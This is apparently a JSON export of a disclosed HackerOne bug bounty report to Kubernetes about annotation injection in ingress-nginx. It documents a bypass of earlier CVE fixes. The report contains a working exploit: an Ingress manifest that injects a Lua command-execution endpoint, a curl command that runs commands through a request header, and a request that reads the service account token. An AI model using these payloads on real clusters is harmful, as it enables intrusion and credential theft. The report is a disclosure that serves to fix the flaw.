@@ -1,0 +1,154 @@
+{
+  "id": 1728174,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzI4MTc0",
+  "url": "https://hackerone.com/reports/1728174",
+  "title": "Ingress nginx annotation injection causes arbitrary command execution",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2022-10-10T09:58:57.855Z",
+  "submitted_at": "2022-10-10T09:58:57.995Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "suanve",
+    "url": "/suanve",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/tqhtbjs547vy6q03pbwyxj3jz8m0/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 39386,
+    "url": "https://hackerone.com/kubernetes",
+    "handle": "kubernetes",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Kubernetes",
+      "twitter_handle": "kubernetesio",
+      "website": "https://kubernetes.io/",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2021-25742",
+    "CVE-2021-25746"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-11-24T21:23:20.589Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2023-10-25T21:23:11.828Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Report Submission Form\n\n## Summary:\n[add a summary of the vulnerability]\nFor CVE-2021-25742 and CVE-2021-25746, I found a bypass method, which is fatal to the current measures taken by the team\nI can easily bypass restrictions and execute arbitrary commands in the express nginx container.\n## Kubernetes Version:\n[add Kubernetes version & distribution in which the issue was found]\n\nServer Version: version.Info{Major:\"1\", Minor:\"25\", GitVersion:\"v1.25.2\", GitCommit:\"5835544ca568b757a8ecae5c153f317e5736700e\", GitTreeState:\"clean\", BuildDate:\"2022-09-21T14:27:13Z\", GoVersion:\"go1.19.1\", Compiler:\"gc\", Platform:\"linux/arm64\"}\n\n\n\n## Component Version:\n[if applicable, add component version the issue was found]\ningress-nginx/controller-v1.4.0\nhttps://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.4.0/deploy/static/provider/cloud/deploy.yaml\n\n## Steps To Reproduce:\n[add details for how we can reproduce the issue, including relevant cluster setup and configuration]\nIn the latest version (1.4.0), alias was blacklisted,However, nginx supports lua. I can use other watches to insert any location configuration items.\nIt is meaningless to simply restrict alias instructions. Your team should start from multiple perspectives.\n\n1. minikube start\n2. kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.4.0/deploy/static/provider/cloud/deploy.yaml\n3. \n\nWe use nginx. ingress. kubernetes The io/configuration snippet annotation can be found in nginx Insert a new location in conf and execute any command through lua.\n\n```shell\ncat > su.yml<<EOF\napiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: ingress-exploit\n  annotations:\n    kubernetes.io/ingress.class: \"nginx\"\n    nginx.ingress.kubernetes.io/configuration-snippet: |\n      more_set_headers \"suanve\"\n            proxy_pass http://upstream_balancer;\n                                proxy_redirect                          off;\n        }\n        location /suanve/ { content_by_lua_block { local rsfile = io.popen(ngx.req.get_headers()[\"cmd\"]);local rschar = rsfile:read(\"*all\");ngx.say(rschar); } } location /fs/{\nspec:\n  rules:\n  - host: suanve.susec.me\n    http:\n      paths:\n      - path: /\n        pathType: Prefix\n        backend:\n          service:\n            name: exploit\n            port:\n              number: 80\n\nEOF\n\nkubectl apply -f su.yml\n```\n\nThis will cause the nginx configuration to be tampered with. We can execute any command in the corresponding ingress.\n\n```shell\ncurl -v -H 'Host: suanve.susec.me' -H \"cmd: id\" 127.0.0.1/suanve/\n*   Trying 127.0.0.1:80...\n* Connected to 127.0.0.1 (127.0.0.1) port 80 (#0)\n> GET /suanve/ HTTP/1.1\n> Host: suanve.susec.me\n> User-Agent: curl/7.79.1\n> Accept: */*\n> cmd: id\n>\n* Mark bundle as not supporting multiuse\n< HTTP/1.1 200 OK\n< Date: Mon, 10 Oct 2022 09:58:18 GMT\n< Content-Type: text/html\n< Transfer-Encoding: chunked\n< Connection: keep-alive\n<\nuid=101(www-data) gid=82(www-data) groups=82(www-data)\n```\n\n* Connection #0 to host 127.0.0.1 left intact\n\n```http\nGET /suanve/ HTTP/1.1\nHost: suanve.susec.me\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\ncmd: cat /var/run/secrets/kubernetes.io/serviceaccount/token\nX-Originating-IP: 127.0.0.1\nX-Remote-IP: 127.0.0.1\nContent-Length: 2\n\n\n\n```\n\n\n\n\n## Supporting Material/References:\n[list any additional material (e.g. screenshots, logs, etc.)]\n{F1978646}\n\n{F1978648}\n  * [attachment / reference]\n\nhttps://hackerone.com/reports/1378175\n\nhttps://github.com/kubernetes/ingress-nginx/issues/8503\n\n## Impact\n\nArbitrary command execution\nGet kubernetes credentials",
+  "bounty_amount": "2500.0",
+  "formatted_bounty": "$2,500",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1978646,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/f68jhxos84ekzpd17yblez3h7pv5?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQCLBSCW4%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143125Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGOMS6KndUyfvT2I7uEKWO2OpyMoWO3KrtU6Cwvkwkz8AiBtqvCr2eNrBUtGm5ctggDHhxd4T895V4LnTvy%2Fe1y10iqyBQh3EAMaDDAxMzYxOTI3NDg0OSIMHupIQsSh6u3QakaCKo8FEangi8DP8q6QvNRth9Zat8LAk3MO5cyfN3saFzIAkHHtBYIwGsMyzlqRCHfrJwp5TOSmSTgY4SMFotd9YHtKikAT%2FFg3PTn0juRiZq1MRLzJCl9e1ltsiXNcIWy5LoOFKRyugt4L7EYfFYGnEP3JhDbLb1HMZGSFjUWDgGfiU5mTvCbjQRp5xdacTwCTp0dIwgeTVnm0%2F5atuPf53fqjIvKBmviD8DwpCe3f%2Blg6lBUKf4GBN5SIg%2FIwKUjs8QUu46Gn3%2Fn2v9ZJVOFoNTozMIOyADbAgOYhoxDxka%2ByoZrYw%2B5O%2FDEVLQ07ZzwNkEna3hMu99uHJUMa7zBHWW9CRxPujTnee8zTXX0vcYuIjZC8Zv0TDDiVmRB%2FvhyPq3A31ooLPXxnYtFTbRIN5cTQM6Dje0pTjIAfsQ0L%2BqizGxkhkti7x1jYsQOKwa1H7DVweXueDL%2FqQpQWJZ5bY%2Boa49ndm0QDgMVpI%2FFl9JVyCFS%2BK4ekj2t9zmFlEhcGaThxQD0R3r80UFWZAAGYWrtfGsGK1xSzUCTzAuF9oPCJG%2B1fpdc8LLKFYYFGzWJvnO7D061Ph%2FifRBQrCa95HlxAPzFa%2B4wLa2mqzbIS2bMx8veVcmaxLoy4bBFVEzLIrXO7oiyRD8FWRPncPQhUoxcqKvfL9rhBNTWwU1bE97ToD9Z6rqd6jMCEuJ7cb%2BTsL14FhS%2FCWYuY4iT0Xo9uawwlA7NqC1S4wCwOJv0QoCgZYoVqoTNkqEyHBVKi5IyOWg59IFRD0iBipXVEQZ1zq%2Fzm3rxd%2FRwAj7MhumS9qJZbj4PLQOxE719tg0UlDCNACZz8IUui5zZz5%2BQFqDCvv%2B%2B74%2BHPNwHq5CUht8ylj1UeqTDL762uBjqyAWt6XWCoHESlfIpPghHCyEYGnW%2FZAnGfl1E2FbZWY72YD7b05jDBLhw81h37eOa0dp96Ri4Fe6sK8XwprMy6ipl%2FaG2GMe%2BXNdFW3axZCWvDRKrUeK2my6Ik%2BRILZhb8Vb8YeAqyNT8tNYuy4RTuRheqpe4PfZmIaKHv%2FGvzGqlLpRqnJnTVWNJDlQOamlRu6iHtu0%2BdOkS%2F5fjpyD2aRw1cPC7GSNUmW%2BBCDgH%2FG7ZFoHk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=10660bd51dffa62cd1de28818e1e30a15f8b7a9d3797aecd6c38d508bff7b917",
+      "file_size": 61042,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1978648,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/re8h85yt3p2e37skauq20u0prar6?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQCLBSCW4%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143125Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGOMS6KndUyfvT2I7uEKWO2OpyMoWO3KrtU6Cwvkwkz8AiBtqvCr2eNrBUtGm5ctggDHhxd4T895V4LnTvy%2Fe1y10iqyBQh3EAMaDDAxMzYxOTI3NDg0OSIMHupIQsSh6u3QakaCKo8FEangi8DP8q6QvNRth9Zat8LAk3MO5cyfN3saFzIAkHHtBYIwGsMyzlqRCHfrJwp5TOSmSTgY4SMFotd9YHtKikAT%2FFg3PTn0juRiZq1MRLzJCl9e1ltsiXNcIWy5LoOFKRyugt4L7EYfFYGnEP3JhDbLb1HMZGSFjUWDgGfiU5mTvCbjQRp5xdacTwCTp0dIwgeTVnm0%2F5atuPf53fqjIvKBmviD8DwpCe3f%2Blg6lBUKf4GBN5SIg%2FIwKUjs8QUu46Gn3%2Fn2v9ZJVOFoNTozMIOyADbAgOYhoxDxka%2ByoZrYw%2B5O%2FDEVLQ07ZzwNkEna3hMu99uHJUMa7zBHWW9CRxPujTnee8zTXX0vcYuIjZC8Zv0TDDiVmRB%2FvhyPq3A31ooLPXxnYtFTbRIN5cTQM6Dje0pTjIAfsQ0L%2BqizGxkhkti7x1jYsQOKwa1H7DVweXueDL%2FqQpQWJZ5bY%2Boa49ndm0QDgMVpI%2FFl9JVyCFS%2BK4ekj2t9zmFlEhcGaThxQD0R3r80UFWZAAGYWrtfGsGK1xSzUCTzAuF9oPCJG%2B1fpdc8LLKFYYFGzWJvnO7D061Ph%2FifRBQrCa95HlxAPzFa%2B4wLa2mqzbIS2bMx8veVcmaxLoy4bBFVEzLIrXO7oiyRD8FWRPncPQhUoxcqKvfL9rhBNTWwU1bE97ToD9Z6rqd6jMCEuJ7cb%2BTsL14FhS%2FCWYuY4iT0Xo9uawwlA7NqC1S4wCwOJv0QoCgZYoVqoTNkqEyHBVKi5IyOWg59IFRD0iBipXVEQZ1zq%2Fzm3rxd%2FRwAj7MhumS9qJZbj4PLQOxE719tg0UlDCNACZz8IUui5zZz5%2BQFqDCvv%2B%2B74%2BHPNwHq5CUht8ylj1UeqTDL762uBjqyAWt6XWCoHESlfIpPghHCyEYGnW%2FZAnGfl1E2FbZWY72YD7b05jDBLhw81h37eOa0dp96Ri4Fe6sK8XwprMy6ipl%2FaG2GMe%2BXNdFW3axZCWvDRKrUeK2my6Ik%2BRILZhb8Vb8YeAqyNT8tNYuy4RTuRheqpe4PfZmIaKHv%2FGvzGqlLpRqnJnTVWNJDlQOamlRu6iHtu0%2BdOkS%2F5fjpyD2aRw1cPC7GSNUmW%2BBCDgH%2FG7ZFoHk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e96b0470742810a0ac7875f6b39d735bbc99dada0016b9986626d44d31fb3a06",
+      "file_size": 118408,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2023-11-24T21:23:12.088Z",
+  "allow_singular_disclosure_after": -6973693.141616403,
+  "singular_disclosure_allowed": true,
+  "vote_count": 55,
+  "voters": [
+    "8910jq",
+    "shreyaschavhan",
+    "p4n7h3rx",
+    "tamay",
+    "k1ngpr4wn",
+    "n1m0",
+    "cb__anonymous",
+    "zy9ard3",
+    "roland_hack",
+    "20kilograma",
+    "and 45 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.6,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "low",
+      "availability": "low"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 32524,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/kubernetes/ingress-nginx",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
